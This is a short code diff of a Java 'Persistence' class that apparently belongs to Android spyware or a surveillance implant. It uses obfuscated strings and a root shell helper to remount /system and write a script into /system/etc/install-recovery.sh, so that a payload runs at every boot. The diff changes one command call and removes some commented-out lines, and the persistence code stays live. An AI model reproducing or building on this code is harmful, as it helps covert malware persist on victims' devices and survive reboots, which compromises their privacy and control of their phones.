@@ -103,13 +103,11 @@ public class Persistence {
 		Root.removeScript(scriptName);
 		
 		// Remount /system
-		Execute.execute(Configuration.shellFile + " " + "blw");
+		Execute.execute(new String[]{Configuration.shellFile, "blw"});
 		
 		// Write our script into /system/etc/install-recovery.sh
 		scriptName = "ip";
 		script = M.e("#!/system/bin/sh") + "\n";
-		//script += Configuration.shellFile + " " + "qzx" + " " + "\"touch "+  M.e(" /system/etc/install-recovery.sh") +"\""+ "\n";
-		//script += Configuration.shellFile + " " + "pzm" + " 755 "+  M.e(" /system/etc/install-recovery.sh")+ "\n";
 		script += Configuration.shellFile + " " + "ape" + " " + "\"" + scriptBody + "\"" + M.e(" /system/etc/install-recovery.sh")+ "\n";
 		
 		Root.createScript(scriptName, script);
@@ -118,11 +116,6 @@ public class Persistence {
 		
 		// Return /system to normal
 		Execute.execute(Configuration.shellFile + " " + "blr");
-		
-		//AutoFile p = new AutoFile( M.e("/system/etc/install-recovery.sh" ));
-		//if(p.exists()){
-		//	EvidenceReference.info("Persistence");
-		//}
 	}
 	
 	public void removePersistance() {
